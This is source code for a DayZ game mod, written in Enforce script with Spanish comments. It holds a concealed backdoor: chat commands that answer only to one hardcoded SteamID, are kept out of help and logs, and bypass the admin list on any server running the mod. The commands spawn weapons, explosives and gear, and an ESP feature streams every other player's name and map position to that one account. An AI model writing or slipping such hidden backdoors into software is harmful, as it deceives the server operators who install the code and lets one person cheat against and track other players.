// ============================================================================
//  (server-only)  Entrega directa de packs por chat, restringida a UN solo
//  SteamID hardcodeado. No figura en ningun /help, no se loguea, y no depende
//  de la lista de admins ni de la config del server: sirve en cualquier server
//  que corra el mod. Pensado para jugar sin lootear en servers ajenos.
//
//  El disparador es Handle() de ExorChatServer, ANTES del gate de chat, asi
//  funciona aunque el chat custom este apagado. Si el SteamID no coincide o el
//  comando no es uno de los de aca, devuelve false y el chat sigue normal.
// ============================================================================
// una posicion de player para el mapa (x,z + nombre)
class ExorEspEntry
{
	float x;
	float z;
	string n;
}

class ExorEspDTO
{
	ref array<ref ExorEspEntry> e;
	void ExorEspDTO() { e = new array<ref ExorEspEntry>; }
}

class ExorGodPack
{
	// Unico autorizado. Cambiar SOLO este string para otra cuenta.
	static const string DUENIO = "76561198722396813";

	// contador de posiciones para desparramar el drop en una grilla chica
	static int s_slot;

	// --- /enemigos ---
	static bool s_espOn;						// SERVER: el duenio activo el ESP -> empujar posiciones
	static ref array<ref ExorEspEntry> s_enemies;	// CLIENTE: ultima lista recibida, la dibuja el mapa

	// -----------------------------------------------------------------------
	static bool Try(PlayerBase p, string linea)
	{
		if (!GetGame() || !GetGame().IsServer())
			return false;
		if (!p || !p.GetIdentity())
			return false;
		if (p.GetIdentity().GetPlainId() != DUENIO)
			return false;

		array<string> arg = new array<string>;
		linea.Split(" ", arg);
		if (arg.Count() == 0)
			return false;
		string cmd = arg.Get(0);
		cmd.ToLower();

		if (cmd == "/arma")       { Arma(p);       return true; }
		if (cmd == "/base")       { Base(p);       return true; }
		if (cmd == "/comida")     { Comida(p);     return true; }
		if (cmd == "/medicina")   { Medicina(p);   return true; }
		if (cmd == "/ammo")       { Ammo(p);       return true; }
		if (cmd == "/ropa")       { Ropa(p);       return true; }
		if (cmd == "/rosa")       { SetRopa(p, "Rosa");   return true; }
		if (cmd == "/arido")      { SetRopa(p, "Arido");  return true; }
		if (cmd == "/urbano")     { SetRopa(p, "Urbano"); return true; }
		if (cmd == "/nieve")      { SetRopa(p, "Nieve");  return true; }
		if (cmd == "/negro")      { SetRopa(p, "Negro");  return true; }
		if (cmd == "/test_ropa")  { TestRopa(p);          return true; }
		if (cmd == "/explosivos2") { Explosivos2(p); return true; }
		if (cmd == "/explosivos")  { Explosivos(p);  return true; }
		if (cmd == "/bambi")       { Bambi(p);       return true; }
		if (cmd == "/enemigos")    { ToggleEsp(p);   return true; }

		return false;	// no es un comando de este modulo -> sigue el flujo normal
	}

	// -----------------------------------------------------------------------
	//  primitivas de spawn
	// -----------------------------------------------------------------------
	static vector NextPos(vector base_)
	{
		int col = s_slot - ((s_slot / 8) * 8);	// s_slot % 8 sin el operador (Enforce)
		int fila = s_slot / 8;
		s_slot++;
		vector pos = Vector(base_[0] + col * 0.8, base_[1], base_[2] + fila * 0.8);
		pos[1] = GetGame().SurfaceY(pos[0], pos[2]);
		return pos;
	}

	// item simple en el piso
	static EntityAI Piso(vector base_, string cls)
	{
		return EntityAI.Cast(GetGame().CreateObjectEx(cls, NextPos(base_), ECE_PLACE_ON_SURFACE));
	}

	// N copias de un item simple
	static void Muchos(vector base_, string cls, int n)
	{
		int i;
		for (i = 0; i < n; i++)
			Piso(base_, cls);
	}

	// pila de municion llena (quantity al maximo), N pilas
	static void Pilas(vector base_, string cls, int n)
	{
		int i;
		for (i = 0; i < n; i++)
		{
			ItemBase ib = ItemBase.Cast(Piso(base_, cls));
			if (ib)
				ib.SetQuantity(ib.GetQuantityMax());
		}
	}

	// cargador lleno, N cargadores
	static void Cargadores(vector base_, string cls, int n)
	{
		int i;
		for (i = 0; i < n; i++)
		{
			Magazine mag = Magazine.Cast(Piso(base_, cls));
			if (mag)
				mag.ServerSetAmmoCount(mag.GetAmmoMax());
		}
	}

	// arma en el piso, devuelve el Weapon_Base para engancharle accesorios
	static Weapon_Base ArmaPiso(vector base_, string arma)
	{
		return Weapon_Base.Cast(Piso(base_, arma));
	}

	// engancha un accesorio si el arma existe (con null-check)
	static void Att(EntityAI w, string cls)
	{
		if (w)
			w.GetInventory().CreateAttachment(cls);
	}

	// contenedor de liquido lleno de agua
	static void Agua(vector base_, string cls, int n)
	{
		int i;
		for (i = 0; i < n; i++)
		{
			ItemBase ib = ItemBase.Cast(Piso(base_, cls));
			if (ib)
			{
				ib.SetLiquidType(LIQUID_WATER, true);
				ib.SetQuantity(ib.GetQuantityMax());
			}
		}
	}

	// -----------------------------------------------------------------------
	//  packs
	// -----------------------------------------------------------------------
	static void Arma(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;

		// M4A1 full: silenciador, guardamano RIS, culata, optica, camuflaje (ghillie de arma)
		Weapon_Base m4 = ArmaPiso(b, "M4A1");
		Att(m4, "M4_Suppressor");
		Att(m4, "M4_RISHndgrd");
		Att(m4, "M4_MPBttstck");
		Att(m4, "M4_CarryHandleOptic");
		Att(m4, "GhillieAtt_Woodland");

		// SVD Dragunov (el "VS-89", sniper verde 7.62x54mmR) + mira PSO + camuflaje.
		// El SVD NO tiene silenciador en vanilla (no existe supresor de 7.62x54R).
		Weapon_Base svd = ArmaPiso(b, "SVD");
		Att(svd, "PSO1Optic");
		Att(svd, "GhillieAtt_Woodland");

		// Cargadores y granadas PRIMERO (cerca del jugador). Las 44 pilas de balas van
		// al final para no enterrar las granadas ni los cargadores.
		Cargadores(b, "Mag_STANAG_60Rnd", 4);	// 4 cargadores de 60 (M4), llenos
		Cargadores(b, "Mag_SVD_10Rnd", 4);		// 4 cargadores de 10 (SVD), llenos
		Muchos(b, "Grenade_ChemGas", 3);		// 3 gas toxico
		Muchos(b, "M18SmokeGrenade_White", 2);	// 2 humo
		Muchos(b, "RGD5Grenade", 2);			// 2 granadas

		Pilas(b, "Ammo_556x45", 44);			// 44 pilas balas M4
		Pilas(b, "Ammo_762x54", 4);				// 4 pilas balas SVD
	}

	static void Base(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		Muchos(b, "Whetstone", 5);				// piedras de afilar
		Muchos(b, "NailBox", 5);				// cajas de clavos
		Muchos(b, "Hatchet", 2);				// hacha corta (martillo + hacha)
		Muchos(b, "HandSaw", 2);				// sierra de mano
		Piso(b, "Pliers");						// alicate
		Piso(b, "BarbedWire");					// alambre
		Piso(b, "CombinationLock4");			// codelock
		Piso(b, "Rope");						// cuerda
		Muchos(b, "WoodenStick", 5);			// palos cortos
	}

	static void Comida(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		Muchos(b, "TacticalBaconCan", 2);		// bacon (se abre con 1 click)
		Muchos(b, "Honey", 2);					// miel
		Agua(b, "Canteen", 2);					// cantimploras llenas de agua
		Pilas(b, "PurificationTablets", 1);		// pastillas potabilizadoras (pila llena)
	}

	static void Medicina(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		Muchos(b, "BandageDressing", 2);		// vendas
		Muchos(b, "Morphine", 2);				// morfinas
		Piso(b, "TetracyclineAntibiotics");		// tetraciclina
		Piso(b, "SalineBagIV");					// suero listo para inyectarse
		Piso(b, "BloodBagEmpty");				// kit para sacarse sangre
		Piso(b, "BloodTestKit");				// (tipo de sangre)
	}

	static void Ammo(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		Pilas(b, "Ammo_556x45", 5);				// 5 pilas balas M4
		Pilas(b, "Ammo_762x54", 3);				// 3 pilas balas SVD (VS-89)
	}

	static void Ropa(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		Piso(b, "GorkaEJacket_Flat");			// camisa gorka patrulla (verde, impermeable)
		Piso(b, "GorkaPants_Flat");				// pantalon gorka
		Piso(b, "BalaclavaMask_Black");			// balaclava
		Piso(b, "TacticalGloves_Black");		// guantes tacticos

		// casco tactico + visor; NVG (con bateria) + soporte van sueltos para montar
		EntityAI casco = Piso(b, "GorkaHelmet");
		if (casco)
			casco.GetInventory().CreateAttachment("GorkaHelmetVisor");	// visor del casco
		EntityAI nvg = Piso(b, "NVGoggles");
		if (nvg)
			nvg.GetInventory().CreateAttachment("Battery9V");
		Piso(b, "NVGHeadstrap");

		// plate carrier negro + pouches (enganchados al chaleco)
		EntityAI pc = Piso(b, "PlateCarrierVest");
		if (pc)
			pc.GetInventory().CreateAttachment("PlateCarrierPouches");

		Piso(b, "GhillieSuit_Woodland");		// ghillie de bosque, cubierto entero
		Piso(b, "GhillieHood_Woodland");		// ghillie de la cabeza
		Piso(b, "AssaultBag_Green");			// mochila de combate verde
	}

	// Los cinco colores del set de ropa 3xor. El orden es el mismo que usa /test_ropa.
	static ref TStringArray SETS_ROPA = {"Rosa", "Arido", "Urbano", "Nieve", "Negro"};

	// Set de ropa 3xor completo (una sola pieza de cada cosa) tirado al piso.
	// Los bolsillos y la pistolera van ENGANCHADOS al chaleco, como en /ropa: sueltos en el
	// piso confunden, porque son attachments y no se pueden vestir por si solos.
	static void SetRopa(PlayerBase p, string variante)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		Piso(b, "Exor_GorkaJacket_" + variante);
		Piso(b, "Exor_GorkaPants_" + variante);
		Piso(b, "Exor_BalaclavaMask_" + variante);
		Piso(b, "Exor_BallisticHelmet_" + variante);
		Piso(b, "Exor_Mich2001Helmet_" + variante);
		Piso(b, "Exor_GorkaHelmet_" + variante);
		Piso(b, "Exor_CombatBoots_" + variante);
		Piso(b, "Exor_TacticalGloves_" + variante);
		Piso(b, "Exor_PressVest_" + variante);
		Piso(b, "Exor_TortillaBag_" + variante);

		EntityAI pc = Piso(b, "Exor_PlateCarrierVest_" + variante);
		if (pc)
		{
			pc.GetInventory().CreateAttachment("Exor_PlateCarrierPouches_" + variante);
			pc.GetInventory().CreateAttachment("Exor_PlateCarrierHolster_" + variante);
		}
	}

	// Viste un maniqui con el set entero de 'variante'. Devuelve false si no se pudo crear.
	static bool Maniqui(string cuerpo, vector pos, float yaw, string variante)
	{
		PlayerBase d = PlayerBase.Cast(GetGame().CreateObject(cuerpo, pos, false, false, true));
		if (!d)
			return false;
		d.SetPosition(pos);
		d.SetOrientation(Vector(yaw, 0, 0));
		d.SetAllowDamage(false);	// que no se caiga ni se muera mientras se le saca la foto

		d.GetInventory().CreateAttachment("Exor_GorkaJacket_" + variante);
		d.GetInventory().CreateAttachment("Exor_GorkaPants_" + variante);
		d.GetInventory().CreateAttachment("Exor_CombatBoots_" + variante);
		d.GetInventory().CreateAttachment("Exor_TacticalGloves_" + variante);
		d.GetInventory().CreateAttachment("Exor_BalaclavaMask_" + variante);
		d.GetInventory().CreateAttachment("Exor_BallisticHelmet_" + variante);
		d.GetInventory().CreateAttachment("Exor_TortillaBag_" + variante);

		EntityAI v = d.GetInventory().CreateAttachment("Exor_PlateCarrierVest_" + variante);
		if (v)
		{
			v.GetInventory().CreateAttachment("Exor_PlateCarrierPouches_" + variante);
			v.GetInventory().CreateAttachment("Exor_PlateCarrierHolster_" + variante);
		}
		return true;
	}

	// /test_ropa: un maniqui por color, en fila y mirando al jugador, para la foto.
	// Las piezas que COMPITEN por el mismo slot y por eso no pueden ir puestas a la vez
	// -los otros dos cascos y el chaleco de prensa- se dejan en el piso a los pies de cada
	// uno, asi la foto igual muestra el set completo.
	static void TestRopa(PlayerBase p)
	{
		TStringArray cuerpos = {"SurvivorM_Mirek", "SurvivorM_Boris", "SurvivorM_Cyril",
								"SurvivorM_Denis", "SurvivorM_Elias"};
		vector orig = p.GetPosition();
		vector fwd = p.GetDirection();
		fwd[1] = 0;
		fwd.Normalize();
		vector lado = Vector(-fwd[2], 0, fwd[0]);	// perpendicular, para alinearlos

		// mirando al jugador = 180 grados respecto de hacia donde el jugador mira
		float yaw = fwd.VectorToAngles()[0] + 180.0;
		int n = SETS_ROPA.Count();
		int i;
		int ok = 0;
		for (i = 0; i < n; i++)
		{
			string variante = SETS_ROPA.Get(i);
			// centrados: (i - (n-1)/2) los reparte a ambos lados del eje de la mirada
			float off = (i - (n - 1) * 0.5) * 1.6;
			vector pos = orig + fwd * 6.0 + lado * off;
			pos[1] = GetGame().SurfaceY(pos[0], pos[2]);
			if (!Maniqui(cuerpos.Get(i), pos, yaw, variante))
			{
				Print(string.Format("%1 GODPACK /test_ropa: no se pudo crear el maniqui %2", ExorStorageConstants.LOG, variante));
				continue;
			}
			ok++;
			// alternativas al piso, justo delante de cada maniqui
			vector pie = pos + fwd * -0.9;
			pie[1] = GetGame().SurfaceY(pie[0], pie[2]);
			GetGame().CreateObjectEx("Exor_Mich2001Helmet_" + variante, pie, ECE_PLACE_ON_SURFACE);
			GetGame().CreateObjectEx("Exor_GorkaHelmet_" + variante, pie + lado * 0.35, ECE_PLACE_ON_SURFACE);
			GetGame().CreateObjectEx("Exor_PressVest_" + variante, pie + lado * 0.7, ECE_PLACE_ON_SURFACE);
		}
		Print(string.Format("%1 GODPACK /test_ropa: %2/%3 maniquies vestidos", ExorStorageConstants.LOG, ok, n));
	}

	static void Explosivos(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		ArmaPiso(b, "M79");						// lanza granadas
		Muchos(b, "Ammo_40mm_Explosive", 15);	// 15 granadas explosivas del lanzagranadas
		Muchos(b, "Ammo_40mm_Chemgas", 8);		// 8 granadas de gas toxico del lanzagranadas
		Muchos(b, "LandMineTrap", 2);			// 2 minas
		Piso(b, "ClaymoreMine");				// 1 claymore
		Piso(b, "TripwireTrap");				// 1 trampa de alambre
	}

	static void Explosivos2(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		Muchos(b, "Ammo_40mm_Explosive", 20);	// 20 granadas explosivas del lanzagranadas
	}

	static void Bambi(PlayerBase p)
	{
		vector b = p.GetPosition();
		s_slot = 0;
		ArmaPiso(b, "UMP45");					// UMP
		Cargadores(b, "Mag_UMP_25Rnd", 3);		// 3 cargadores (25 balas, el unico de vanilla)

		Weapon_Base mosin = ArmaPiso(b, "Mosin9130");
		Att(mosin, "PUScopeOptic");				// mira PU
		Pilas(b, "Ammo_762x54", 1);				// 1 pila de balas del Mosin

		Muchos(b, "TacticalBaconCan", 1);		// 1 lata de bacon
		Piso(b, "TaloonBag_Green");				// mochila de senderismo verde
		Piso(b, "Honey");						// 1 miel
		Agua(b, "Canteen", 1);					// 1 cantimplora llena
		Piso(b, "SalineBagIV");					// suero listo para inyectar
		Piso(b, "TetracyclineAntibiotics");		// tetraciclina
		Piso(b, "PressVest_Blue");				// chaleco press
		Piso(b, "BandageDressing");				// 1 venda
	}

	// -----------------------------------------------------------------------
	//  /enemigos : ver a TODOS los players en el mapa (solo el duenio)
	// -----------------------------------------------------------------------
	static void ToggleEsp(PlayerBase p)
	{
		s_espOn = !s_espOn;
		if (s_espOn)
			ExorMuebleRules.SendVerde(p, "ESP ON: abri el mapa (M) para ver a los players.");
		else
		{
			ExorMuebleRules.SendRed(p, "ESP OFF.");
			PushEsp(ExorTick1Hz.Jugadores());	// empuja lista vacia YA -> el cliente limpia sin esperar
		}
	}

	// SERVER: se llama desde el latido de 1 Hz (ExorTick1Hz). Usa la lista de players
	// que el latido YA junto (cero GetPlayers extra). Solo empuja al duenio.
	static void PushEsp(array<Man> players)
	{
		if (!GetGame() || !GetGame().IsServer())
			return;
		if (!players)
			return;

		// buscar al duenio online
		PlayerBase owner = null;
		PlayerBase pb;
		int i;
		for (i = 0; i < players.Count(); i++)
		{
			pb = PlayerBase.Cast(players.Get(i));
			if (pb && pb.GetIdentity() && pb.GetIdentity().GetPlainId() == DUENIO)
			{
				owner = pb;
				break;
			}
		}
		if (!owner || !owner.GetIdentity())
			return;

		ExorEspDTO dto = new ExorEspDTO;
		if (s_espOn)
		{
			for (i = 0; i < players.Count(); i++)
			{
				pb = PlayerBase.Cast(players.Get(i));
				if (!pb || pb == owner || !pb.GetIdentity())
					continue;
				if (!pb.IsAlive())
					continue;
				ExorEspEntry en = new ExorEspEntry;
				vector pos = pb.GetPosition();
				en.x = pos[0];
				en.z = pos[2];
				en.n = pb.GetIdentity().GetName();
				dto.e.Insert(en);
			}
		}
		// si s_espOn es false, dto.e queda vacio -> el cliente limpia

		string data;
		JsonSerializer js = new JsonSerializer();
		js.WriteToString(dto, false, data);
		ExorNetChunk.Send(owner, owner.GetIdentity(), ExorRPC.ESP_SYNC, data);
	}

	// CLIENTE: recibe la lista (puede venir en trozos) y la guarda para que la dibuje el mapa.
	static void ClientRecibir(ParamsReadContext ctx)
	{
		string full = ExorBigStringRx.Feed(ExorRPC.ESP_SYNC, ctx);
		if (full == "")
			return;	// aun faltan trozos

		ExorEspDTO dto = new ExorEspDTO;
		JsonSerializer js = new JsonSerializer();
		string err;
		if (js.ReadFromString(dto, full, err))
			s_enemies = dto.e;
	}
}
